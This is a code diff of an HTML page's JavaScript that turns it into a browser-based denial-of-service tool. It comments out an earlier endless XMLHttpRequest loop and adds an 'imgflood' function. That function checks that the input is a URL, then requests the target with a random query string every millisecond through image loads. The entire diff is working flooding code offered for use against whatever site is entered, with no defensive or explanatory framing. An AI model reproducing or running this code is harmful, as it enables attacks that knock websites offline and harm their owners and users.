@@ -6,6 +6,7 @@
   </head>
   <body style="background-color: #000000">
     <script type="text/javascript">
+    /*
     function start(urll) {
     const Http = new XMLHttpRequest();
     const url=urll;
@@ -20,6 +21,23 @@
   function aaa(){
     for (var i=0; i>-1; i++){
       start(document.getElementById('sss').value);
+    }
+  }*/
+    </script>
+
+    <script type="text/javascript">
+    function imgflood() {
+      var TARGET = document.getElementById('sss').value;
+      var pic = new Image();
+      var rand = Math.floor(Math.random() * 1000);
+      pic.src = TARGET+'?val='+rand;
+
+}
+    function aaa(){
+      if (document.getElementById('sss').value.search( /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/) != -1){
+      setInterval(imgflood, 1);
+    }else{
+      alert('It is not a url.')
     }
   }
     </script>
